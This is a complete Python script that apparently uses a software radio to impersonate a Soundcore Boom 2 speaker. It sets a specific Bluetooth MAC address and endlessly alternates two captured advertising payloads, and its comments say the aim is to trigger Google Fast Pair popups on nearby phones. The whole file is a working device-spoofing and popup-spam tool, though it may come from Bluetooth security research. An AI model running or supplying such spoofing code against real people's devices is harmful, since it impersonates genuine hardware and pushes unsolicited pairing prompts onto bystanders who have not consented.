#!/usr/bin/env python3
"""
Demo: Emulate Soundcore Boom 2 — Fast Pair popup attempt

Uses the EXACT discoverable payload captured from the real device.

Usage:
    python demo_emulate_soundcore.py [port]
Press Ctrl+C to stop.
"""

import sys
import time
from feralrf import Radio, PHY

PORT = sys.argv[1] if len(sys.argv) > 1 else "/dev/ttyACM0"

# MAC in nRF Connect display order
MAC = "CB:2B:7D:35:5A:0E"

# The 3 payloads captured from real Soundcore Boom 2
# Payload 3 is the discoverable Fast Pair that triggers popup
ANKER_PAYLOAD = bytes.fromhex("02010a0505daf57b010ffff42b7d355a0e0000000000000000")
FASTPAIR_DISCOVERABLE = bytes.fromhex("020af606162cfe8f95f8")  # EXACT from capture, no extra flags

radio = Radio(PORT)
radio.connect()
time.sleep(1)
radio.init()
radio.set_ble_addr_str(MAC)
radio.set_phy(PHY.BLE_1M, channel=37)

print(f"Emulating Soundcore Boom 2 on {PORT}")
print(f"MAC: {MAC}")
print(f"Fast Pair Model ID: 0x8F95F8")
print("Alternating Anker + Fast Pair discoverable payloads")
print("Press Ctrl+C to stop")
print()

count = 0
try:
    while True:
        # Alternate like the real device does
        radio.transmit(FASTPAIR_DISCOVERABLE, power_dbm=5)
        time.sleep(0.02)
        radio.transmit(ANKER_PAYLOAD, power_dbm=5)
        time.sleep(0.02)
        count += 2
        if count % 200 == 0:
            print(f"  {count} pkts...", end="\r")
except KeyboardInterrupt:
    print(f"\nStopped. Total: {count} packets")
finally:
    radio.disconnect()
